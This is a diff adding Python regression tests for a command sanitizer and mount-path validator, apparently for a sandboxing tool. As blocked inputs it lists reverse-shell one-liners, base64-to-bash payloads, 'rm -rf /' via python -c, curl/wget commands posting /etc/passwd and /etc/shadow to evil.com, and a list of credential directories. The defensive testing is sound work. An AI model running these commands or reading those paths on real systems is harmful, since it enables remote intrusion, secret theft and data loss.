@@ -793,3 +793,225 @@ class TestEnvironmentVariableEdgeCases:
         """Test environment variable with URL percent encoding."""
         key, value = validate_environment_variable("ENCODED", "hello%20world")
         assert value == "hello%20world"
+
+
+class TestEncodedExecutionPatterns:
+    """Regression tests for encoded payload execution patterns."""
+
+    @pytest.mark.parametrize(
+        "command,test_id",
+        [
+            ("base64 -d payload.b64 | bash", "base64_d_pipe_bash"),
+            ("base64 --decode payload.b64 | sh", "base64_decode_pipe_sh"),
+            ("base64 -d /tmp/payload | python", "base64_d_pipe_python"),
+            ("base64 -d /tmp/payload | perl", "base64_d_pipe_perl"),
+            ("base64 -d /tmp/payload | ruby", "base64_d_pipe_ruby"),
+            ("echo dGVzdA== | base64 -d | bash", "echo_base64_d_bash"),
+            ("echo dGVzdA== | base64 --decode | sh", "echo_base64_decode_sh"),
+        ],
+        ids=lambda x: x[1] if isinstance(x, tuple) else str(x),
+    )
+    def test_encoded_execution_blocked(self, command: str, test_id: str) -> None:
+        """Test that encoded payload execution patterns are blocked."""
+        with pytest.raises(UnsafeOperationError, match="dangerous pattern"):
+            sanitize_command(command)
+
+    def test_base64_encode_allowed(self) -> None:
+        """Test that base64 encoding (not decoding to shell) is allowed."""
+        result = sanitize_command(["base64", "file.txt"])
+        assert result == ["base64", "file.txt"]
+
+    def test_base64_decode_to_file_allowed(self) -> None:
+        """Test that base64 decode to file (no pipe to interpreter) is allowed."""
+        result = sanitize_command(["base64", "-d", "payload.b64", "-o", "output.bin"])
+        assert result == ["base64", "-d", "payload.b64", "-o", "output.bin"]
+
+
+class TestInlineCodeExecutionPatterns:
+    """Regression tests for inline code execution patterns."""
+
+    @pytest.mark.parametrize(
+        "command,test_id",
+        [
+            ("python -c 'import os; os.system(\"rm -rf /\")'", "python_c"),
+            ("python3 -c 'import socket'", "python3_c"),
+            ("python2 -c 'print(1)'", "python2_c"),
+            ("perl -e 'system(\"ls\")'", "perl_e"),
+            ("ruby -e 'exec(\"ls\")'", "ruby_e"),
+            ('node -e \'require("child_process").exec("ls")\'', "node_e"),
+            ("lua -e 'os.execute(\"ls\")'", "lua_e"),
+        ],
+        ids=lambda x: x[1] if isinstance(x, tuple) else str(x),
+    )
+    def test_inline_code_execution_blocked(self, command: str, test_id: str) -> None:
+        """Test that inline code execution patterns are blocked."""
+        with pytest.raises(UnsafeOperationError, match="dangerous pattern"):
+            sanitize_command(command)
+
+    def test_python_script_file_allowed(self) -> None:
+        """Test that running Python scripts from files is allowed."""
+        result = sanitize_command(["python", "script.py"])
+        assert result == ["python", "script.py"]
+
+    def test_python_module_allowed(self) -> None:
+        """Test that running Python modules is allowed."""
+        result = sanitize_command(["python", "-m", "pytest"])
+        assert result == ["python", "-m", "pytest"]
+
+    def test_node_script_file_allowed(self) -> None:
+        """Test that running Node.js scripts from files is allowed."""
+        result = sanitize_command(["node", "app.js"])
+        assert result == ["node", "app.js"]
+
+    def test_perl_script_file_allowed(self) -> None:
+        """Test that running Perl scripts from files is allowed."""
+        result = sanitize_command(["perl", "script.pl"])
+        assert result == ["perl", "script.pl"]
+
+
+class TestReverseShellPatterns:
+    """Regression tests for reverse shell patterns."""
+
+    @pytest.mark.parametrize(
+        "command,test_id",
+        [
+            ("nc -e /bin/bash 10.0.0.1 4444", "nc_reverse_shell"),
+            ("ncat -e /bin/sh attacker.com 9999", "ncat_reverse_shell"),
+            ("netcat -l -p 4444", "netcat_listener"),
+            ("nc -lp 4444", "nc_listener_combined"),
+            ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "bash_dev_tcp"),
+            ("socat TCP:attacker.com:4444 exec:/bin/sh", "socat_exec"),
+        ],
+        ids=lambda x: x[1] if isinstance(x, tuple) else str(x),
+    )
+    def test_reverse_shell_blocked(self, command: str, test_id: str) -> None:
+        """Test that reverse shell patterns are blocked."""
+        with pytest.raises(UnsafeOperationError, match="dangerous pattern"):
+            sanitize_command(command)
+
+    def test_nc_port_scan_allowed(self) -> None:
+        """Test that nc port scanning (-z flag) is allowed."""
+        result = sanitize_command(["nc", "-z", "localhost", "80"])
+        assert result == ["nc", "-z", "localhost", "80"]
+
+    def test_socat_without_exec_allowed(self) -> None:
+        """Test that socat without exec is allowed."""
+        result = sanitize_command(["socat", "TCP-LISTEN:8080", "TCP:localhost:80"])
+        assert result == ["socat", "TCP-LISTEN:8080", "TCP:localhost:80"]
+
+
+class TestDataExfiltrationPatterns:
+    """Regression tests for data exfiltration patterns."""
+
+    @pytest.mark.parametrize(
+        "command,test_id",
+        [
+            ("curl -X POST http://evil.com/collect -d @/etc/passwd", "curl_post_data"),
+            ("curl --data @secrets.txt http://evil.com", "curl_data_file"),
+            ("curl --upload-file /etc/shadow http://evil.com", "curl_upload"),
+            ("curl -F file=@/etc/passwd http://evil.com", "curl_form_upload"),
+            ("wget --post-data='secret' http://evil.com", "wget_post_data"),
+            ("wget --post-file=/etc/passwd http://evil.com", "wget_post_file"),
+        ],
+        ids=lambda x: x[1] if isinstance(x, tuple) else str(x),
+    )
+    def test_data_exfiltration_blocked(self, command: str, test_id: str) -> None:
+        """Test that data exfiltration patterns are blocked."""
+        with pytest.raises(UnsafeOperationError, match="dangerous pattern"):
+            sanitize_command(command)
+
+    def test_curl_get_allowed(self) -> None:
+        """Test that curl GET requests are allowed."""
+        result = sanitize_command(["curl", "http://example.com"])
+        assert result == ["curl", "http://example.com"]
+
+    def test_curl_download_allowed(self) -> None:
+        """Test that curl downloads are allowed."""
+        result = sanitize_command(["curl", "-o", "file.tar.gz", "http://example.com/file.tar.gz"])
+        assert result == ["curl", "-o", "file.tar.gz", "http://example.com/file.tar.gz"]
+
+    def test_wget_download_allowed(self) -> None:
+        """Test that wget downloads are allowed."""
+        result = sanitize_command(["wget", "http://example.com/file.tar.gz"])
+        assert result == ["wget", "http://example.com/file.tar.gz"]
+
+
+class TestDockerSocketBlocklist:
+    """Regression tests for Docker socket and runtime path blocking."""
+
+    def test_run_docker_sock_blocked(self) -> None:
+        """Test that /run/docker.sock (symlink target) is blocked."""
+        with pytest.raises(UnsafeOperationError, match="blocked"):
+            validate_mount_path("/run/docker.sock")
+
+    def test_var_run_docker_dir_blocked(self) -> None:
+        """Test that /var/run/docker directory is blocked."""
+        with pytest.raises(UnsafeOperationError, match="blocked"):
+            validate_mount_path("/var/run/docker")
+
+    def test_var_run_docker_subpath_blocked(self) -> None:
+        """Test that subpaths of /var/run/docker are blocked."""
+        with pytest.raises(UnsafeOperationError, match="blocked"):
+            validate_mount_path("/var/run/docker/containerd")
+
+    def test_run_docker_dir_blocked(self) -> None:
+        """Test that /run/docker directory is blocked."""
+        with pytest.raises(UnsafeOperationError, match="blocked"):
+            validate_mount_path("/run/docker")
+
+    def test_run_docker_subpath_blocked(self) -> None:
+        """Test that subpaths of /run/docker are blocked."""
+        with pytest.raises(UnsafeOperationError, match="blocked"):
+            validate_mount_path("/run/docker/plugins")
+
+    def test_var_run_non_docker_allowed(self) -> None:
+        """Test that non-Docker paths under /var/run are allowed."""
+        validate_mount_path("/var/run/myapp.pid")
+
+    def test_run_non_docker_allowed(self) -> None:
+        """Test that non-Docker paths under /run are allowed."""
+        validate_mount_path("/run/myapp.pid")
+
+
+class TestExpandedCredentialDirs:
+    """Regression tests for expanded credential directory blocking."""
+
+    @pytest.mark.parametrize(
+        "path,test_id",
+        [
+            ("/home/user/.gnupg", "gnupg_home"),
+            ("/home/user/.gnupg/private-keys-v1.d", "gnupg_subdir"),
+            ("/home/user/.config/gcloud", "gcloud"),
+            ("/home/user/.config/gcloud/credentials.json", "gcloud_creds"),
+            ("/home/user/.azure", "azure"),
+            ("/home/user/.azure/accessTokens.json", "azure_tokens"),
+            ("/home/user/.config/gh", "gh_cli"),
+            ("/home/user/.config/gh/hosts.yml", "gh_hosts"),
+            ("/home/user/.npmrc", "npmrc"),
+            ("/home/user/.pypirc", "pypirc"),
+        ],
+        ids=lambda x: x[1] if isinstance(x, tuple) else str(x),
+    )
+    def test_credential_dir_blocked(self, path: str, test_id: str) -> None:
+        """Test that expanded credential directories are blocked."""
+        with pytest.raises(UnsafeOperationError, match="credential directory"):
+            validate_mount_path(path)
+
+    def test_original_credential_dirs_still_blocked(self) -> None:
+        """Test that original credential dirs are still blocked after expansion."""
+        for path in [
+            "/home/user/.ssh",
+            "/home/user/.aws",
+            "/home/user/.kube",
+            "/home/user/.docker",
+        ]:
+            with pytest.raises(UnsafeOperationError, match="credential directory"):
+                validate_mount_path(path)
+
+    def test_config_dir_without_credentials_allowed(self) -> None:
+        """Test that .config without credential subpaths is allowed."""
+        validate_mount_path("/home/user/.config/myapp")
+
+    def test_npm_dir_allowed(self) -> None:
+        """Test that .npm cache dir (not .npmrc) is allowed."""
+        validate_mount_path("/home/user/.npm")
